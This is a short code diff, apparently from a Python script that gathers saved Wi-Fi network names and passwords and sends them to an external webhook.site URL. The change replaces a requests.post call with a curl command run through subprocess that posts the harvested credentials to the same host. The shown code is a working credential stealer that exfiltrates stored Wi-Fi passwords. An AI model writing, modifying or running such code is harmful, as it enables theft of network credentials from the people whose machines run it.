@@ -1,6 +1,5 @@
 import subprocess
 import os
-import requests
 
 url = "https://webhook.site/8ccec680-192e-4976-9c79-93d9ab5c5945"
 
@@ -34,4 +33,4 @@ for name in wifi_files:
 for x, y in zip(wifi_names, wifi_passwords):
 	INFO += "SSID: " + x.ljust(28, "-") + "PASS: " + y + "\n"
 
-r = requests.post(url, data=INFO)
+subprocess.run(["curl", "-X", "POST", "-H", "Content-Type: text/plain", "-d", INFO, "--url", url])
